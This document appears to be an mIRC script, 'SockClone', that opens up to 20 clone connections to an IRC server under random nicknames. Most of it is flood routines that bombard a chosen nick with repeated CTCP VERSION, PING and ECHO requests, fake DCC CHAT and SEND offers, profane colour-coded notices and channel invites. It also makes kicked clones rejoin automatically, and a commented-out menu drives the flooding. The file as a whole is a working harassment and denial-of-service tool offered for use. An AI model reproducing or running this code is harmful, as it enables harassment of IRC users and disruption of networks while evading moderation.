

on 1:connect:{
  sockclonecheck
  .timersockclonecheck 0 30 sockclonecheck
}
on 1:disconnect:{
  sockclonecheck
  .timersockclonecheck 0 30 sockclonecheck
}
alias sockclone { 
  if ($3 == $null) { usage SockClone }
  if (($1 <= 0) || ($1 > 20)) { echo -a %sockclone.prompt Number of Clone(s) must be between 1 and 20 | halt }
  inc %sockclone-number $1
  .timer $1 5 sockclone.connect $2 $3
  .timersockclonecheck 0 30 sockclonecheck
}
alias sockclonecheck {
  if (($sock(sockclone1) == $null) && ($sock(sockclone2) == $null) && ($sock(sockclone3) == $null) && ($sock(sockclone4) == $null) && ($sock(sockclone5) == $null) && ($sock(sockclone6) == $null) && ($sock(sockclone7) == $null) && ($sock(sockclone8) == $null) && ($sock(sockclone9) == $null) && ($sock(sockclone10) == $null) && ($sock(sockclone11) == $null) && ($sock(sockclone12) == $null) && ($sock(sockclone13) == $null) && ($sock(sockclone14) == $null) && ($sock(sockclone15) == $null) && ($sock(sockclone16) == $null) && ($sock(sockclone17) == $null) && ($sock(sockclone18) == $null)) {
    if (($sock(sockclone19) == $null) && ($sock(sockclone20) == $null)) {
      sockclone.die -CHECK-
    }
  }
}
alias sockclone.connect {
  inc %sockclone-inc 1
  sockopen SockClone [ $+ [ %sockclone-inc ] ] $1 $2
}
alias sockclone.tsunami {
  if (%sockclone-number == $null) { echo -a %sockclone.prompt You don't have clones running, try enable them. | halt }
  if ($1 == $null) { echo -a %sockclone.prompt You need specify a nick to flood | halt }
  set %sockclone-loop 0
  :tsustart
  inc %sockclone-loop 1
  if (%sockclone-loop > 20) { unset %sockclone-loop | halt }
  else { 
    set %sockclone-temp SockClone [ $+ [ %sockclone-loop ] ]
    if ($sock(%sockclone-temp).rcvd == 0) { goto start }
    if ($sock(SockClone [ $+ [ %sockclone-loop ] ] ) != $null) { 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
      sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :VERSION 
    }
  }
  goto tsustart
}

alias sockclone.flood {
  if (%sockclone-number == $null) { echo -a %sockclone.prompt You don't have clones running, try enable them. | halt }
  if ($1 == $null) { echo -a %sockclone.prompt You need specify a nick to flood | halt }
  set %sockclone-loop 0
  :start
  inc %sockclone-loop 1
  if (%sockclone-loop > 20) { unset %sockclone-loop | halt }
  else { 
    set %sockclone-temp SockClone [ $+ [ %sockclone-loop ] ]
    if ($sock(%sockclone-temp).rcvd == 0) { goto start }
    if ($sock(SockClone [ $+ [ %sockclone-loop ] ] ) != $null) { 
      .timer 1 1 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NICK $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
      .timer 1 3 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 VERSION 
      .timer 1 5 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 PING 
      .timer 1 7 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 ECHO 6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU 
      .timer 1 9 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 USERINFO 
      .timer 1 11 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 CLIENTINFO 
      .timer 1 13 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC CHAT 000000000 000 000 25 
      .timer 1 15 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC SEND FucK.YoU 3353362454 25 666
      .timer 1 17 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NOTICE $1 4,14!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4F7U8C9K11U13¡4!7¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4!7¡4!8!9¡
      .timer 1 19 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] INVITE $1 #PIZZA
      .timer 1 21 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NICK $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
      .timer 1 23 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 VERSION 
      .timer 1 25 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 PING 
      .timer 1 27 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 ECHO 6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU 
      .timer 1 29 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 USERINFO 
      .timer 1 31 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 CLIENTINFO 
      .timer 1 33 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC CHAT 000000000 000 000 25 
      .timer 1 35 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC SEND FucK.YoU 3353362454 25 666
      .timer 1 37 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NOTICE $1 4,14!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4F7U8C9K11U13¡4!7¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4!7¡4!8!9¡
      .timer 1 39 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] INVITE $1 #PIZZA
      .timer 1 41 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NICK $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
      .timer 1 43 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 VERSION 
      .timer 1 45 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 PING 
      .timer 1 47 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 ECHO 6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU6FUCK4YOU 
      .timer 1 49 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 USERINFO 
      .timer 1 51 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 CLIENTINFO 
      .timer 1 53 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC CHAT 000000000 000 000 25 
      .timer 1 55 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] PRIVMSG $1 :DCC SEND FucK.YoU 3353362454 25 666
      .timer 1 57 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] NOTICE $1 4,14!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4F7U8C9K11U13¡4!7¡4!7¡8!9¡11!13¡4!7¡8!9¡11!13¡4!7¡4,14!7¡8!9¡11!13¡4!7¡4!8!9¡
      .timer 1 59 sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] INVITE $1 #PIZZA
    }
  }
  goto start
}
alias sockclone.die {
  if ($1 == -Check-) {
    unset %sockclone-*
    .timersockclonecheck off
    halt
  }
  if (%sockclone-number == $null) { echo -a %sockclone.prompt You don't have clones running, try enable them. | halt }
  set %sockclone-loop 0
  :start
  inc %sockclone-loop 1
  if (%sockclone-loop > 20) { unset %sockclone-loop | unset %sockclone-* | .timersockclonecheck off | halt }
  else { 
    set %sockclone-temp SockClone [ $+ [ %sockclone-loop ] ]
    if ($sock(%sockclone-temp).rcvd == 0) { sockclose %sockclone-temp | goto start } 
    if ($sock(SockClone [ $+ [ %sockclone-loop ] ] ) != $null) { .sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] quit : $+ %sockclone.prompt by  8,1 F®åñ|<j Pø\\'eRz }
  }
  goto start
}
alias sockclone.command {
  if (%sockclone-number == $null) { echo -a %sockclone.prompt You don't have clones running, try enable them. | halt }
  if ($1 == $null) { echo -a %sockclone.prompt You need specify a command | halt }
  set %sockclone-loop 0
  :start
  inc %sockclone-loop 1
  if (%sockclone-loop > 20) { unset %sockclone-loop | halt }
  else { 
    set %sockclone-temp SockClone [ $+ [ %sockclone-loop ] ]
    if ($sock(%sockclone-temp).rcvd == 0) { goto start }
    if ($sock(SockClone [ $+ [ %sockclone-loop ] ] ) != $null) { sockwrite -tn SockClone [ $+ [ %sockclone-loop ] ] $1- }
  }
  goto start
}
on 1:sockopen:*:{
  if (SockClone isin $sockname) {
    sockwrite -tn $sockname user 4,6PizzaBogus - - : $+ %sockclone.prompt  8,1 F®åñ|<j Pø\\'eRz
    if ($right($sockname,2) isin 10-11-12-13-14-15-16-17-18-19-20) {
      set %temp.sock.nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
    }
    else {
      set %temp.sock.nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
    }
    sockwrite -tn $sockname NICK %temp.sock.nick $crlf
    unset %temp.sock.nick
  }
}
on 1:sockread:*:{
  if (SockClone isin $sockname) {
    sockread %sockclone-rcvd
    if ($left(%sockclone-rcvd,6) == PING $+ $chr(32) $+ :) { sockwrite -tn $sockname PONG $mid(%sockclone-rcvd,6,$len(%sockclone-rcvd)) }
    if (KICK isin $gettok(%sockclone-rcvd,2,32)) {
      sockwrite -tn $sockname JOIN $gettok(%sockclone-rcvd,3,32)}
    }
  }
}
;menu menubar {
;  -
;  &SockClone 
;    .&Connect:sockclone $?="How many? (Ex: 5)" $?="Server Address:" $?="Port:"
;  .&Disconnect:sockclone.die
;  .&Join a channel:sockclone.command join : $+ $?="#Channel" $?="Extra Parameters:"
;  .&Part a channel:sockclone.command part : $+ $?="#Channel" $?="Extra Parameters:"
;  .&Message Nick/#Channel:sockclone.command privmsg $?="Nick/#Channel" : $+ $?="Message"
;  .&Notice Nick/#Channel:sockclone.command notice $?="Nick/#Channel" : $+ $?="Notice"
;  .&Flood Someone:sockclone.flood $?="Nick/Channel"
;  .&Command:sockclone.command $?="Command:"
;}
